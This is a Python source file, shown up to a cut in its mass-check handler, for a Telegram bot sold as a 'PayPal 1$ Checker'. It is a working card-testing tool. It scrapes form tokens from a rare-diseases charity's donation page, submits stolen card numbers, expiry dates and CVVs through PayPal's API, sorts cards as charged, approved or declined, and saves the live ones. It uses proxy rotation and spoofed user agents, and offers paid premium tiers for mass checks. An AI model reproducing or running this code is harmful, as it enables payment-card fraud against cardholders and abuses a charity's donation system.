import telebot, cloudscraper, base64, re, time, os, json, threading, hashlib, requests, random, datetime, queue, urllib3
urllib3.disable_warnings()
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor

BOT_TOKEN = 'BOT_TOKEN' # Bot Token
ADMIN_ID = 12345678 # Admin ID
bot = telebot.TeleBot(BOT_TOKEN)

USERS_FILE = 'Data/users.txt'
PREMIUM_FILE = 'Data/premium.txt'
BANNED_FILE = 'Data/banned.txt'
STATS_FILE = 'stats.json'
CHARGED_FILE = 'Data/charged.txt'
APPROVED_FILE = 'Data/approved.txt'

FREE_LIMIT = 0
PREMIUM_LIMIT = 1000
MAX_RETRIES = 3

USE_PROXY = False
PROXY_FILE = "proxy.txt"

ACTIVE_JOBS = {}
ACTIVE_USERS_PP = {}
ACTIVE_USERS_MPP = {}
USER_ACTIVE_JOB = {}
STATS_LOCK = threading.Lock()

os.makedirs('Data', exist_ok=True)
for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, APPROVED_FILE, CHARGED_FILE]:
    if not os.path.exists(f): open(f, 'w').close()
if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, 'w') as f: json.dump({"charged": 0, "approved": 0, "total_users": 0, "premium_users": 0, "banned_users": 0}, f)

def expiry_checker():
    while True:
        try:
            if os.path.exists(PREMIUM_FILE):
                with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
                new_lines = []
                for line in lines:
                    if '|' in line:
                        parts = line.strip().split('|')
                        uid, exp = parts[0], float(parts[1])
                        if exp != 0 and time.time() > exp:
                            try: bot.send_message(int(uid), "[!] 𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗥𝗲𝗻𝗲𝘄 𝗻𝗼𝘄 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 𝗲𝗻𝗷𝗼𝘆𝗶𝗻𝗴 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀!")
                            except: pass
                            continue
                    new_lines.append(line)
                with open(PREMIUM_FILE, 'w') as f: f.writelines(new_lines)
            if os.path.exists(BANNED_FILE):
                with open(BANNED_FILE, 'r') as f: lines = f.readlines()
                new_lines = []
                for line in lines:
                    if '|' in line:
                        parts = line.strip().split('|')
                        uid, exp = parts[0], float(parts[1])
                        if exp != 0 and time.time() > exp:
                            try: bot.send_message(int(uid), "[!] 𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗯𝗮𝗻 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱! 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘄 𝗳𝗿𝗲𝗲 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗮𝗴𝗮𝗶𝗻. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲 𝗿𝘂𝗹𝗲𝘀.")
                            except: pass
                            continue
                    new_lines.append(line)
                with open(BANNED_FILE, 'w') as f: f.writelines(new_lines)
        except Exception as e:
            print(f"[!] Expiry Checker Error: {e}")
        time.sleep(60)

threading.Thread(target=expiry_checker, daemon=True).start()

def get_stats():
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'r') as f: return json.load(f)
        except: return {"charged": 0, "approved": 0, "total_users": 0, "premium_users": 0, "banned_users": 0}

def save_stats(stats):
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'w') as f: json.dump(stats, f)
        except: pass

def save_unique_cc(filepath, cc, note):
    cc_num = cc.split('|')[0].strip()
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            if cc_num in f.read():
                return
    except FileNotFoundError:
        pass
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{cc} - {note}\n")

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    with open(PREMIUM_FILE, 'r') as f:
        premiums = f.read().splitlines()
        for p in premiums:
            if str(user_id) in p:
                parts = p.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
                else: return True
    return False

def is_banned(user_id):
    with open(BANNED_FILE, 'r') as f:
        bans = f.read().splitlines()
        for b in bans:
            if str(user_id) in b:
                parts = b.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
                else: return True
    return False

def add_user(user_id):
    with open(USERS_FILE, 'r+') as f:
        users = f.read().splitlines()
        if str(user_id) not in users:
            f.write(str(user_id) + '\n')
            s = get_stats()
            s["total_users"] = len(users) + 1
            save_stats(s)

proxy_list = []
PROXY_QUEUE = queue.Queue()

if USE_PROXY and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
        proxy_list = lines
        for p in lines:
            PROXY_QUEUE.put(p)

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str: return None
    if '@' in proxy_str: return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return proxy_str

def get_proxy_dict():
    if PROXY_QUEUE.empty(): return None, None
    p = PROXY_QUEUE.get()
    fp = format_proxy(p)
    proxy_dict = None
    if not any(p.startswith(proto) for proto in ['http', 'socks']):
        proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
    else:
        proxy_dict = {"http": fp, "https": fp}
    return proxy_dict, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', 'UNKNOWN')
            country = data.get('country_name', 'UNKNOWN')
            brand = data.get('brand', 'UNKNOWN')
            level = data.get('level', 'N/A')
            type_cc = data.get('type', 'N/A')
            return brand, bank, country, level, type_cc
    except: pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A"

def fmt(code):
    return str(code)

def check_cc(ccx, proxy=None):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "ERROR", "Invalid Format"
       
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
        
        us = generate_user_agent()
        user = generate_user_agent()
        
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies.update(proxy)
            
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
            
        with session as r:
            headers_get = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'upgrade-insecure-requests': '1',
                'user-agent': us,
            }
            
            response = r.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=30)
            
            if 'cf-ray' in response.headers or 'Cloudflare' in response.text or response.status_code == 403:
                return "ERROR", "Cloudflare Block"
            
            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
            m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
            m3 = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
            m4 = re.search(r'"data-client-token":"(.*?)"', response.text)
            
            if not all([m1, m2, m3, m4]):
                return "ERROR", "Page Load Error"
            
            id_form1 = m1.group(1)
            id_form2 = m2.group(1)
            nonec = m3.group(1)
            enc = m4.group(1)
            
            dec = base64.b64decode(enc).decode('utf-8')
            m_au = re.search(r'"accessToken":"(.*?)"', dec)
            if not m_au:
                return "ERROR", "Token Error"
            au = m_au.group(1)
            
            headers_post = {
                'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': us,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data_post = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': 'https://www.rarediseasesinternational.org/donate/',
                'give-form-url': 'https://www.rarediseasesinternational.org/donate/',
                'give-form-minimum': '1',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': 'xunarch',
                'give_last': 'xunarch',
                'give_email': 'xunarch@gmail.com',
                'card_name': 'xunarch',
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', headers=headers_post, data=data_post, timeout=30)
            
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-minimum': (None, '1'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'xunarch'),
                'give_last': (None, 'xunarch'),
                'give_email': (None, 'xunarch@gmail.com'),
                'card_name': (None, 'xunarch'),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_multipart = {
                'content-type': data_multipart.content_type,
                'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/',
                'user-agent': us,
            }
            
            params = {'action': 'give_paypal_commerce_create_order'}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=30)
            tok = response.json()['data']['id']
            
            headers_paypal = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
            }
            
            json_data_paypal = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }
            
            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data_paypal, timeout=30, verify=False)
            
            data_approve = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-minimum': (None, '1'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'xunarch'),
                'give_last': (None, 'xunarch'),
                'give_email': (None, 'xunarch@gmail.com'),
                'card_name': (None, 'xunarch'),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_approve = {
                'content-type': data_approve.content_type,
                'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/',
                'user-agent': us,
            }
            
            params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_approve, data=data_approve, timeout=30, verify=False)
            
            text = response.text
            text_up = text.upper()
            # Charged
            if any(k in text_up for k in ['APPROVESTATE":"APPROVED', 'PARENTTYPE":"AUTH', 'APPROVEGUESTPAYMENTWITHCREDITCARD', 'ADD_SHIPPING_ERROR', 'THANK YOU FOR DONATION', 'YOUR PAYMENT HAS ALREADY BEEN PROCESSED', 'THANKS', '"SUCCESS":TRUE']):
                if '"ERRORS"' not in text_up and '"ERROR"' not in text_up:
                    return "CHARGED", "Thank you for donation"
            # Approved
            if 'INSUFFICIENT_FUNDS' in text_up:
                return "APPROVED", "INSUFFICIENT_FUNDS"
            elif 'CVV2_FAILURE' in text_up:
                return "APPROVED", "CVV2_FAILURE"
            elif 'INVALID_SECURITY_CODE' in text_up:
                return "APPROVED", "INVALID_SECURITY_CODE"
            elif 'INVALID_BILLING_ADDRESS' in text_up:
                return "APPROVED", "INVALID_BILLING_ADDRESS"
            elif 'EXISTING_ACCOUNT_RESTRICTED' in text_up or 'ACCOUNT RESTRICTED' in text_up:
                return "APPROVED", "EXISTING_ACCOUNT_RESTRICTED"
            elif 'IS3SECUREREQUIRED' in text_up or 'OTP' in text_up:
                return "APPROVED", "3D_REQUIRED"
            # Declined
            elif 'DO_NOT_HONOR' in text_up:
                return "DECLINED", "Do not honor"
            elif 'ACCOUNT_CLOSED' in text_up:
                return "DECLINED", "Account closed"
            elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text_up:
                return "DECLINED", "Account closed"
            elif 'LOST_OR_STOLEN' in text_up:
                return "DECLINED", "LOST OR STOLEN"
            elif 'SUSPECTED_FRAUD' in text_up:
                return "DECLINED", "SUSPECTED FRAUD"
            elif 'INVALID_ACCOUNT' in text_up:
                return "DECLINED", "INVALID_ACCOUNT"
            elif 'REATTEMPT_NOT_PERMITTED' in text_up:
                return "DECLINED", "REATTEMPT NOT PERMITTED"
            elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text_up:
                return "DECLINED", "ACCOUNT_BLOCKED_BY_ISSUER"
            elif 'ORDER_NOT_APPROVED' in text_up:
                return "DECLINED", "ORDER_NOT_APPROVED"
            elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text_up:
                return "DECLINED", "PICKUP_CARD_SPECIAL_CONDITIONS"
            elif 'PAYER_CANNOT_PAY' in text_up:
                return "DECLINED", "PAYER CANNOT PAY"
            elif 'GENERIC_DECLINE' in text_up:
                return "DECLINED", "GENERIC_DECLINE"
            elif 'COMPLIANCE_VIOLATION' in text_up:
                return "DECLINED", "COMPLIANCE VIOLATION"
            elif 'TRANSACTION_NOT_PERMITTED' in text_up:
                return "DECLINED", "TRANSACTION NOT PERMITTED"
            elif 'PAYMENT_DENIED' in text_up:
                return "DECLINED", "PAYMENT_DENIED"
            elif 'INVALID_TRANSACTION' in text_up:
                return "DECLINED", "INVALID TRANSACTION"
            elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text_up:
                return "DECLINED", "RESTRICTED OR INACTIVE ACCOUNT"
            elif 'SECURITY_VIOLATION' in text_up:
                return "DECLINED", "SECURITY_VIOLATION"
            elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text_up:
                return "DECLINED", "DECLINED DUE TO UPDATED ACCOUNT"
            elif 'INVALID_OR_RESTRICTED_CARD' in text_up:
                return "DECLINED", "INVALID CARD"
            elif 'EXPIRED_CARD' in text_up:
                return "DECLINED", "EXPIRED CARD"
            elif 'CRYPTOGRAPHIC_FAILURE' in text_up:
                return "DECLINED", "CRYPTOGRAPHIC FAILURE"
            elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text_up:
                return "DECLINED", "TRANSACTION CANNOT BE COMPLETED"
            elif 'DECLINED_PLEASE_RETRY' in text_up:
                return "DECLINED", "DECLINED PLEASE RETRY LATER"
            elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text_up:
                return "DECLINED", "EXCEED LIMIT"
            
            else:
                try:
                    res_json = response.json()
                    err = res_json.get('data', {}).get('error', 'Transaction Failed')
                    return "DECLINED", str(err)
                except:
                    return "DECLINED", "Transaction Failed"
                    
    # Error
    except Exception as e:
        msg = str(e)
        if "Read timed out" in msg or "timeout" in msg.lower(): return "ERROR", "Read Timeout"
        if "ProxyError" in msg or "HTTPSConnectionPool" in msg: return "ERROR", "Proxy/Connection Fail"
        return "ERROR", f"Req Error: {msg[:30]}"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    fname = message.from_user.first_name

    if is_admin(user_id):
        menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗮𝘆𝗽𝗮𝗹 𝟭$ 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

⌬ 𝗨𝘀𝗲𝗿 𝗖𝗺𝗱𝘀:
/pp <cc|mm|yy|cvv> - 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸
/mpp (reply to file) - 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸
/stop - 𝗦𝘁𝗼𝗽 𝗠𝗮𝘀𝘀 𝗝𝗼𝗯
/info <userid> - 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼

⌬ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗺𝗱𝘀:
/addpremium <userid> <duration> - 𝗔𝗱𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
/rmpremium <userid> - 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
/ban <userid> <duration> - 𝗕𝗮𝗻 𝗨𝘀𝗲𝗿
/unban <userid> - 𝗨𝗻𝗯𝗮𝗻 𝗨𝘀𝗲𝗿
/stats - 𝗕𝗼𝘁 𝗦𝘁𝗮𝘁𝘀
/broadcast <msg> - 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁


⌬ 𝐃𝐞𝐯 ↬ @Xoarch"""
    elif is_premium(user_id):
        menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗮𝘆𝗽𝗮𝗹 𝟭$ 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

⌬ 𝗖𝗺𝗱𝘀:
/pp <cc|mm|yy|cvv> - 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸
/mpp (reply to file) - 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸
/stop - 𝗦𝘁𝗼𝗽 𝗠𝗮𝘀𝘀 𝗝𝗼𝗯
/info - 𝗠𝘆 𝗜𝗻𝗳𝗼

⌬ 𝐃𝐞𝐯 ↬ @Xoarch"""
    else:
        if FREE_LIMIT == 0:
            menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗮𝘆𝗽𝗮𝗹 𝟭$ 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

⌬ 𝗖𝗺𝗱𝘀:
/pp <cc|mm|yy|cvv> - 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸
/mpp - 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 (𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗢𝗻𝗹𝘆)
/stop - 𝗦𝘁𝗼𝗽 𝗠𝗮𝘀𝘀 𝗝𝗼𝗯
/info - 𝗠𝘆 𝗜𝗻𝗳𝗼

⌬ 𝐃𝐞𝐯 ↬ @Xoarch"""
        else:
            menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗮𝘆𝗽𝗮𝗹 𝟭$ 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

⌬ 𝗖𝗺𝗱𝘀:
/pp <cc|mm|yy|cvv> - 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸
/mpp (reply to file) - 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸
/stop - 𝗦𝘁𝗼𝗽 𝗠𝗮𝘀𝘀 𝗝𝗼𝗯
/info - 𝗠𝘆 𝗜𝗻𝗳𝗼

⌬ 𝐃𝐞𝐯 ↬ @Xoarch"""

    bot.reply_to(message, menu)


@bot.message_handler(commands=['pp'])
def pp(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)

    if ACTIVE_USERS_PP.get(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮 𝘀𝗶𝗻𝗴𝗹𝗲 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗻𝗻𝗶𝗻𝗴! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁.")
        return
        
    try:
        cc = message.text.split()[1]
        if len(cc.split('|')) < 4:
            raise ValueError
    except (IndexError, ValueError):
        bot.reply_to(message, "[✗] 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗖𝗮𝗿𝗱 𝗙𝗼𝗿𝗺𝗮𝘁! 𝗨𝘀𝗲: 𝟰𝟭𝟭𝟭|𝟬𝟰|𝟮𝟲|𝟭𝟮𝟯")
        return
    
    ACTIVE_USERS_PP[user_id] = True
    msg = bot.reply_to(message, "𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭...")
    
    status, response = "ERROR", "N/A"
    for _ in range(MAX_RETRIES):
        proxy_dict = None
        p_raw = None
        if USE_PROXY:
            proxy_dict, p_raw = get_proxy_dict()
            
        try:
            status, response = check_cc(cc, proxy_dict)
        finally:
            if USE_PROXY: release_proxy(p_raw)
            
        if status != "ERROR": break
        
    response = fmt(response)
        
    bin_code = cc[:6]
    brand, bank, country, level, type_cc = get_bin_info(bin_code)
    
    status_font = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝" if status == "DECLINED" else "𝐄𝐫𝐫𝐨𝐫"
    
    if status == "CHARGED":
        s = get_stats(); s["charged"] += 1; save_stats(s)
        os.makedirs('Data', exist_ok=True)
        save_unique_cc('Data/charged.txt', cc, response)
    elif status == "APPROVED":
        s = get_stats(); s["approved"] += 1; save_stats(s)
        os.makedirs('Data', exist_ok=True)
        save_unique_cc('Data/approved.txt', cc, response)

    if is_admin(user_id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
    elif is_premium(user_id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
    else: is_p = " [𝗙𝗥𝗘𝗘]"
    
    safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
    safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
    safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
    
    res = f"""
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ <code>{response}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝐏𝐚𝐲𝐩𝐚𝐥 𝟏$
━━━━━━━━━━━
𝐈𝐧𝐟𝐨 ➜ {safe_brand} - {type_cc} - {level}
𝐁𝐚𝐧𝐤 ➜ {safe_bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country}
━━━━━━━━━━━
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ {safe_fname}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
    try: bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")
    except Exception as e:
        print("[!] Final Msg Edit HTML error: ", e)
        try: bot.edit_message_text(res.replace("<code>", "").replace("</code>", ""), message.chat.id, msg.message_id)
        except:
            try: bot.reply_to(message, res, parse_mode="HTML")
            except: pass
        
    ACTIVE_USERS_PP[user_id] = False

@bot.message_handler(commands=['mpp'])
def mpp(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    
    if ACTIVE_USERS_MPP.get(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮 𝗺𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗻𝗻𝗶𝗻𝗴! 𝗣𝗹𝗲𝗮𝘀𝗲 /𝘀𝘁𝗼𝗽 𝗶𝘁 𝗳𝗶𝗿𝘀𝘁.")
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 /mpp")
        return
    
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    ccs = downloaded_file.decode('utf-8').splitlines()
    ccs = list(dict.fromkeys([l.strip() for l in ccs if l.strip()]))
    
    is_p = is_premium(user_id)
    limit = PREMIUM_LIMIT if is_p or is_admin(user_id) else FREE_LIMIT
    
    if limit == 0:
        was_premium = False
        with open(PREMIUM_FILE, 'r') as f:
            for line in f:
                if str(user_id) in line: was_premium = True; break

        if was_premium:
            bot.reply_to(message, "[✗] 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗢𝗻𝗹𝘆! 𝗬𝗼𝘂𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄.")
        else:
            bot.reply_to(message, "[✗] 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗢𝗻𝗹𝘆! 𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝘁𝗼 𝘂𝘀𝗲 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸.")
        return
        
    total_found = len(ccs)
    
    if total_found > limit:
